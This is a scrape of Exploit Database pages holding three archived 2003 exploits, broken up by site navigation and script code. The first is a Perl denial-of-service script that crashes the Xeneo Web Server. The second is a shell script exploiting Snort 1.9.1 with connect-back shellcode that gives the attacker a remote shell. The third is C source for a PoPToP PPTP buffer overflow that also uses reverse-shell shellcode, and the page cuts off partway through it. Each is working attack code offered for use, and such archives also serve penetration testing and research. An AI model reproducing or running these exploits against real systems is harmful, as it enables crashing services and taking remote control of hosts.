FerrisType:dosExploit:/Platform:WindowsDate:2003-04-22Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl# Xeneo Web Server DoS## Vulnerable systems:# Xeneo. Web Server 2.2.9.0## Written by badpack3t <badpack3t@security-protocols.com># For SP Research Labs# 04/21/2003## www.security-protocols.com## usage:# perl sp-xeneo.pl <target> <port>#use IO::Socket;use strict;print ".:."x 20; print "\nXeneo Web Server 2.2.9.0 DoS, <badpack3t\@security-protocols.com>\n";print ".:."x 20; print "\n\n";if( !defined( $ARGV[ 0 ] && $ARGV[ 1 ])){&usage;}my $host = $ARGV[ 0 ];my $def = "?";my $num = "4096";my $port = $ARGV[ 1 ];my $urfuqed = $def x $num;my $tcpval = getprotobyname( 'tcp' );my $serverIP = inet_aton( $host );my $serverAddr = sockaddr_in( $ARGV[ 1 ], $serverIP );my $protocol_name = "tcp";my $iaddr = inet_aton( $host ) || die ( "host was not found: $host" );my $paddr = sockaddr_in( $port, $iaddr ) || die ( "you did something wrong stupid... exiting..." );my $proto = getprotobyname( 'tcp' ) || die ( "cannot get protocol" );socket( SOCK, PF_INET, SOCK_STREAM, $proto ) || die ( "socket could not open: $host" );connect( SOCK, $paddr ) || die ( "cannot connect to: $host" );my $submit = "GET /$urfuqed HTTP/1.0\r\n\r\n";send( SOCK,$submit,0 );close( SOCK );sub usage{die( "\n\nUsage: perl $0 <target_host> <port>\n\n" );}print "\n.:.:.:.:.:.:.:.:.:.:.:.";print "\ncrash was successful ~!\n";print "\.:.:.:.:.:.:.:.:.:.:.:.\n";# milw0rm.com [2003-04-22]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 18
Snort 1.9.1 - 'p7snort191.sh' Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSnort 1.9.1 - 'p7snort191.sh' Remote Command ExecutionEDB-ID:18CVE:2003-0209EDB Verified:Author:truffType:remoteExploit:/Platform:LinuxDate:2003-04-23Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh########################################################### p7snort191.sh by truff (truff@projet7.org)             ## Snort 1.9.1 and below remote exploit                   ##                                                        ## Tested on Slackware 8.0 with Snort 1.9.1 from sources  ##                                                        ## Usage:                                                 ## 1/ Launch a listening netcat to listen for the shell   ## nc -p 45295 -l                                         ##                                                        ## 2/ p7snort119.sh yourIP [Ret_Addr]                     ##                                                        ## Where yourIP is the IP where the netcat is listening   ## and Ret_Addr is the address (8 hexa digits) of the     ## shellcode (eg: 0819fec2)                               ##                                                        ##                                                        ## This vulnerability was discovered by Bruce Leidl,      ## Juan Pablo Martinez Kuhn, and Alejandro David Weil     ## from Core Security Technologies during Bugweek 2003.   ##                                                        ## Greetz to #root people and projet7 members.            ## Special thx to mycroft for helping me with shell       ## scripting stuff.                                       ##                                                        ## www.projet7.org - Security Researchs -                 ############################################################ Put here the path to your hping2 binaryHPING2=/usr/sbin/hping2# You should change these params to make the snort sensor# capture the packets.IPSRC=192.168.22.1IPDST=192.168.22.2PTSRC=3339PTDST=111echo "p7snort191.sh by truff (truff@projet7.org)"case $# in0)echo "Bad number of params"echo "Read comments in sources"exit -1;;1)RET=0819fec2echo "Using default retaddr (Slackware 8.0)"echo $RET;;2)RET=$2echo "Using custom retaddr"echo $RET;;*)echo "Bad number of params"echo "Read comments in sources"exit -1;;esac# Nopsi=0while [ "$i" -lt "512" ]; doi=$(expr "$i" + 1)echo -n -e "\x90" >> eggdone# linux x86 shellcode by eSDee of Netric (www.netric.org)# 131 byte - connect back shellcode (port=0xb0ef)echo -n -e "\x31\xc0\x31\xdb\x31\xc9\x51\xb1" >> eggecho -n -e "\x06\x51\xb1\x01\x51\xb1\x02\x51" >> eggecho -n -e "\x89\xe1\xb3\x01\xb0\x66\xcd\x80" >> eggecho -n -e "\x89\xc2\x31\xc0\x31\xc9\x51\x51" >> eggecho -n -e "\x68" >> egg# IP hereecho -n -e $(printf "\\\x%02x" $(echo $1 | cut -d. -f1) \$(echo $1 | cut -d. -f2) \$(echo $1 | cut -d. -f3) \$(echo $1 | cut -d. -f4)) >> eggecho -n -e "\x66\x68\xb0" >> eggecho -n -e "\xef\xb1\x02\x66\x51\x89\xe7\xb3" >> eggecho -n -e "\x10\x53\x57\x52\x89\xe1\xb3\x03" >> eggecho -n -e "\xb0\x66\xcd\x80\x31\xc9\x39\xc1" >> eggecho -n -e "\x74\x06\x31\xc0\xb0\x01\xcd\x80" >> eggecho -n -e "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80" >> eggecho -n -e "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01" >> eggecho -n -e "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3" >> eggecho -n -e "\xb1\x02\xcd\x80\x31\xc0\x31\xd2" >> eggecho -n -e "\x50\x68\x6e\x2f\x73\x68\x68\x2f" >> eggecho -n -e "\x2f\x62\x69\x89\xe3\x50\x53\x89" >> eggecho -n -e "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0" >> eggecho -n -e "\x01\xcd\x80" >> egg# 3 dummy bytes for alignment purposesecho -n -e "\x41\x41\x41" >> eggi=0cpt=$(expr 3840 - 134 - 512)cpt=$(expr $cpt / 4)var1=0x$(echo $RET | cut -b7,8)var2=0x$(echo $RET | cut -b5,6)var3=0x$(echo $RET | cut -b3,4)var4=0x$(echo $RET | cut -b1,2)while [ "$i" -lt "$cpt" ]; doi=$(expr "$i" + 1)echo -n -e $(printf "\\\x%02x" $var1 $var2 $var3 $var4) >> eggdone# hping ruleZ$HPING2 $IPDST -a $IPSRC -s $PTSRC -p $PTDST --ack --rst -c 1 \-d 0x1 --setseq 0xffff0023 --setack 0xc0c4c014 \1>/dev/null 2>/dev/null$HPING2 $IPDST -a $IPSRC -s $PTSRC -p $PTDST --ack --rst -c 1 \-d 0xF00 -E egg --setseq 0xffffffff --setack 0xc0c4c014 \1>/dev/null 2>/dev/null$HPING2 $IPSRC -a $IPDST -s $PTDST -p $PTSRC --ack -c 1 \-d 0 --setseq 0xc0c4c014 --setack 0xffffffff \1>/dev/null 2>/dev/nullrm eggecho "Exploit Sended"# milw0rm.com [2003-04-23]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 19
PoPToP PPTP 1.1.4-b3 - 'poptop-sane.c' Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPoPToP PPTP 1.1.4-b3 - 'poptop-sane.c' Remote Command ExecutionEDB-ID:19CVE:2003-0213EDB Verified:Author:blightninjasType:remoteExploit:/Platform:LinuxDate:2003-04-25Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Fixed Exploit against PoPToP in Linux (poptop-sane.c)* ./r4nc0rwh0r3 of blightninjas (blightninjas@hushmail.com)** blightninjas: bringing pain, suffering, and humiliation to the security world* Expect more great release like helloworld-annotated.c and* cd explained whitepaper, we are working hard in da underground** Other Editions Available At:*   http://www.freewebs.com/blightninjas/**  *** Bugtraq Clean Edition **** Based off of code by einstein_dhtm@front.ru** Notes on the exploit:* This was only tested under slackware, RET_OFF could possibly* be different.* You can have nulls in the shellcode (the hole is in a read())* This allows you to have ips and ports with nulls in them** Shouts to ADM, TESO, and all the other "cool" groups that never give us 0day** Examples:* attack target 1* nc -v -l -p 10000 <-- on 1.1.1.2* ./poptop-sane 1.1.1.1 1.1.1.2 10000 -t 1* don't come to use, we come to you.** ./poptop-sane 1.1.1.1 1.1.1.2 10000 -t* list targets** ./poptop-sane 1.1.1.1 1.1.1.2 10000 -r 0xbffff600* attack using ret address 0xbffff600** I think you get the point*/#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <signal.h>#define NOP_LENGTH 140// I calculate at 336, I'll fudge to make more general#define RET_OFF 320#define MAX_HOSTNAME_SIZE               64#define MAX_VENDOR_SIZE                 64#define PPTP_VERSION                    0x0100/* Magic Cookie */#define PPTP_MAGIC_COOKIE               0x1a2b3c4d/* Message types */#define PPTP_CTRL_MESSAGE               1/* Control Connection Management */#define START_CTRL_CONN_RQST            1#define START_CTRL_CONN_RPLY            2#define STOP_CTRL_CONN_RQST             3#define STOP_CTRL_CONN_RPLY             4#define ECHO_RQST                       5#define ECHO_RPLY                       6// brute force values// Values can be increased both ways#define TOPOFSTACK 0xbffff800#define BOTTOMOFSTACK 0xbffff000#define STEP 64/* esdee I love you, call me sometime */charshellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x51\xb1""\x06\x51\xb1\x01\x51\xb1\x02\x51""\x89\xe1\xb3\x01\xb0\x66\xcd\x80""\x89\xc2\x31\xc0\x31\xc9\x51\x51""\x68\x41\x42\x43\x44\x66\x68\xb0""\xef\xb1\x02\x66\x51\x89\xe7\xb3""\x10\x53\x57\x52\x89\xe1\xb3\x03""\xb0\x66\xcd\x80\x31\xc9\x39\xc1""\x74\x06\x31\xc0\xb0\x01\xcd\x80""\x31\xc0\xb0\x3f\x89\xd3\xcd\x80""\x31\xc0\xb0\x3f\x89\xd3\xb1\x01""\xcd\x80\x31\xc0\xb0\x3f\x89\xd3""\xb1\x02\xcd\x80\x31\xc0\x31\xd2""\x50\x68\x6e\x2f\x73\x68\x68\x2f""\x2f\x62\x69\x89\xe3\x50\x53\x89""\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0""\x01\xcd\x80";int st;struct target {char *desc;u_int32_t ret;} targets[] ={{"Slackware 8.0 Linux 2.4.18 pptpd-1.0.1", 0xbffff540},{"Slackware 8.0 Linux 2.4.18 pptpd-1.1.3", 0xbffff580},};struct pptp_header {u_int16_t length;               /* pptp message length incl header */u_int16_t pptp_type;            /* pptp message type */u_int32_t magic;                /* magic cookie */u_int16_t ctrl_type;            /* control message type */u_int16_t reserved0;            /* reserved */};struct pptp_start_ctrl_conn_rqst {struct pptp_header header;      /* pptp header */u_int16_t version;              /* pptp protocol version */u_int16_t reserved1;            /* reserved */u_int32_t framing_cap;          /* framing capabilities */u_int32_t bearer_cap;           /* bearer capabilities */u_int16_t max_channels;         /* maximum channels */u_int16_t firmware_rev;         /* firmware revision */u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */};struct pptp_echo_rqst {struct pptp_header header;      /* header */u_int32_t identifier;           /* value to match rply with rqst */char buf[10000];};struct pptp_reply {struct pptp_header header;      /* header */char buf[10000];};void catch_pipe() {printf("Broken pipe caught, server most likely patched.\n");exit(1);}void send_init_request(int st){struct pptp_start_ctrl_conn_rqst request;request.header.magic = htonl(PPTP_MAGIC_COOKIE);request.header.pptp_type = htons(PPTP_CTRL_MESSAGE);request.header.ctrl_type = htons(START_CTRL_CONN_RQST);request.version = PPTP_VERSION;request.framing_cap = 0;request.bearer_cap = 0;request.max_channels = 1;request.firmware_rev = 0;strcpy(request.hostname,"hell");strcpy(request.vendor,"domain HELL");request.header.length = ntohs(sizeof(request));send(st,(char*)&request,sizeof(request),0);}void send_ping_overflow(int st, u_int32_t ret, char *hostname, short port){struct pptp_echo_rqst ping;int i, buflen = 500;ping.header.magic = htonl(PPTP_MAGIC_COOKIE);ping.header.pptp_type = htons(PPTP_CTRL_MESSAGE);ping.header.ctrl_type = htons(ECHO_RQST);ping.identifier = 111;ping.header.length = ntohs(1);for (i = 0; i < NOP_LENGTH; i++) ping.buf[i] = '\x90';*(unsigned long int*)(shellcode+33) = inet_addr(hostname);*(unsigned short int*)(shellcode+39) = htons(port);memcpy(ping.buf+NOP_LENGTH,shellcode,sizeof(shellcode));for(i = RET_OFF; i < buflen - 4; i+=4)memcpy(ping.buf+i,(char*)&ret,4);send(st,(char*)&ping,sizeof(ping.header)+buflen,0);}int connect_server(char* hostname){struct sockaddr_in addr;st=socket(PF_INET,SOCK_STREAM,0);if ((st=socket(PF_INET,SOCK_STREAM,0)) == -1) return 0;addr.sin_family=AF_INET;addr.sin_port=0;addr.sin_addr.s_addr=0;bind(st, (struct sockaddr *)&addr,sizeof(struct sockaddr));addr.sin_family=AF_INET;addr.sin_port=htons(1723);addr.sin_addr.s_addr=inet_addr(hostname);printf("connecting... ");if ((connect(st,(struct sockaddr*)&addr,sizeof(addr))) != 0){perror("connect");return 0;}return 1;}int main(int argc, char** argv){struct pptp_reply reply;// rushing things only makes it worseint timeout = 1000;u_int32_t ret;int bytes, j, checked = 0;signal(SIGPIPE, catch_pipe);printf("\n");// Sorry, I failed REALLY FUCKING LAME ASCII ART classprintf("        D     A     SSSSS                           \n");printf("        D    A A    S     SSSSS     T\n");printf("        D   A   A   S     S         T     EE    AA   M   M \n");printf("    DDD D  AAAAAAA  SSSSS S         T    E  E  A  A  MM MM \n");printf("   D   DD  A     A      S SSSSS    TTTT  E  E  A  A  MM MM \n");printf("  D     D  A     A      S     S     T    EEE   AAAA  M M M \n");printf("   D    D  A     A  SSSSS     S     T    E     A  A  M   M \n");printf("    DDDD   A     A        SSSSS      TTT  EEE  A  A  M   M   ");printf(" ... presents ... \n\n");printf("Exploit for PoPToP PPTP server older than\n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");printf("by .einstein., April 2003.  <-- the genius\n\n");printf("fixed by ./r4nc0rwh0r3 of blightninjas  blightninjas@hushmail.com\n\n");if (argc < 2){printf("usage: \n");printf("  %s <pptp_server> [your_ip] [your_port] ...\n",argv[0]);printf("   -b [timeout in ms]\n");printf("   -t [target]\n");printf("   -r [ret address]\n");//Abridged editionprintf(" Only supply pptp_server to test 